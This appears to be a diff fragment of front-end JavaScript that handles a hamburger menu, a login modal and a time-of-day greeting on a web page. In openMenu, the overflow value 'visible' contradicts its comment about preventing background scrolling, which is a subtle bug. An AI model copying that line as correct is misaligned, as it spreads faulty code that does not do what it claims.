+/* ---- SHOW the hamburger menu (make it visible) ---- */
+function openMenu(){
+  menuPanel.classList.add('open');         // slide panel onto screen
+  menuBackdrop.classList.add('show');      // darken backdrop
+  hamburger.setAttribute('aria-expanded','true');
+  menuPanel.setAttribute('aria-hidden','false');
+  document.body.style.overflow = 'visible'; /* prevent background scrolling while menu is open */
+}
+
+/* ---- HIDE the hamburger menu (make it invisible) ---- */
+function closeMenu(){
+  menuPanel.classList.remove('open');      // slide panel off screen
+  menuBackdrop.classList.remove('show');   // remove dark backdrop
+  hamburger.setAttribute('aria-expanded','false');
+  menuPanel.setAttribute('aria-hidden','true');
+  document.body.style.overflow = 'auto';
+}
+
+/* Events that make the menu visible / invisible */
+hamburger.addEventListener('click', openMenu);   // hamburger -> show menu
+menuClose.addEventListener('click', closeMenu);  // X button  -> hide menu
+menuBackdrop.addEventListener('click', closeMenu); // backdrop -> hide menu
+
+document.querySelectorAll('.menu-item').forEach(item => {
+  item.addEventListener('click', ()=>{
+    document.querySelectorAll('.menu-item').forEach(i => i.classList.remove('active'));
+    item.classList.add('active');
+    closeMenu();
+    if(!sessionUnlocked){
+      openLogin();
+    }
+  });
+});
+
+document.getElementById('loginSubmit').addEventListener('click', submitLogin);
+document.getElementById('loginCancel').addEventListener('click', closeLogin);
+document.getElementById('loginClose').addEventListener('click', closeLogin);
+loginOverlay.addEventListener('click', (e)=>{ if(e.target === loginOverlay) closeLogin(); });
+loginEmail.addEventListener('keydown', (e)=>{ if(e.key==='Enter') loginPassword.focus(); });
+loginPassword.addEventListener('keydown', (e)=>{ if(e.key==='Enter') submitLogin(); });
+/* Clear the red "invalid" border as soon as the user starts typing. */
+loginEmail.addEventListener('input', ()=>{ loginEmail.classList.remove('invalid'); });
+loginPassword.addEventListener('input', ()=>{ loginPassword.classList.remove('invalid'); });
+
+/* Time-based greeting in the main content header. */
+(function(){
+  const el = document.querySelector('.greeting');
+  if(!el) return;
+  const h = new Date().getHours();
+  let part;
+  if(h < 5) part = 'Working late';
+  else if(h < 12) part = 'Good morning';
+  else if(h < 18) part = 'Good afternoon';
+  else part = 'Good evening';
+  el.textContent = part + ' \u2014 welcome back';
+})();
+
+checkAuth();
+</script>
+
+</body>
+</html>
